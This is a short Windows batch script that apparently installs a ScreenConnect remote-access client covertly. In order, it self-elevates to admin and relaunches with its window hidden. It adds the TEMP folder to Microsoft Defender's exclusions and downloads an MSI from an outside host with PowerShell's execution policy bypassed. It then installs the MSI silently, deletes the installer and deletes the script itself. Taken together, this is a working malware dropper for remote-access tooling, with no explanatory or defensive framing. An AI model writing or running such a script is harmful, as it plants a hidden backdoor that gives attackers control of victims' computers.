@echo off
:: 1. Self-Elevate to Admin (Required for Whitelisting)
>nul 2>&1 fsutil dirty query %systemdrive% || (
    powershell start -verb runas '%0' & exit /b
)

:: 2. Relaunch this script hidden so the CMD window disappears
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "%~s0 hidden" & exit /b
)

:: --- EVERYTHING BELOW THIS LINE RUNS TOTALLY INVISIBLE ---

:: 3. Whitelist the temp folder
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'"

:: 4. Download the MSI
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://support.swed.org/Bin/ScreenConnect.ClientSetup.xx?e=Access&y=Guest' -OutFile '%TEMP%\installer.msi'"

:: 5. Install silently
msiexec.exe /i "%TEMP%\installer.msi" /qn /norestart

:: 6. Cleanup
del "%TEMP%\installer.msi"

:: 7. Optional: Delete this BAT file when done
(goto) 2>nul & del "%~f0"
